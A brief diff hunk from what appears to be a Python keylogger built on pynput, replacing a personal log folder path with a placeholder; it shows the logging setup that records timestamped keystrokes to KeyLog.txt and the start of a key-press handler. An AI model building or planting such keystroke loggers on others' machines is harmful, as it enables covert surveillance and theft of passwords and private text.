@@ -2,7 +2,7 @@ import pynput
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = r"C:\Users\Stephen Gardner\Desktop\Keylogger"
+log_dir = r"C:\Example\File\Location"
 logging.basicConfig(filename = (log_dir + r"/KeyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
                     
 def on_press(key):
